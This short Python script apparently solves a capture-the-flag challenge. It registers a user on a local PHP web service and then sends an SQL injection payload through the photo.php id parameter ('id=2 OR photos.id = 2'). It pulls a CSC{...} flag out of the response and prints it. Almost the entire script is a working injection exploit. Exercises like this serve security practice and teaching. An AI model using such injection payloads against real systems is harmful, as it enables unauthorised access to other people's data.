import requests
import string
import random
import re

SERVICE_URL = "http://localhost:8000"

r = requests.session()

r.post(SERVICE_URL + '/register.php', data={ 'username': 'David Vandorpe ' + ''.join(random.choice(string.printable) for i in range(8)), 'password': 'test123sdkhghokdgshsdgklhsdgc' })

response = r.get(SERVICE_URL + '/photo.php?id=2 OR photos.id = 2')
flag = re.search('(CSC{.*})', response.content.decode('utf-8')).group(1)
print(flag)

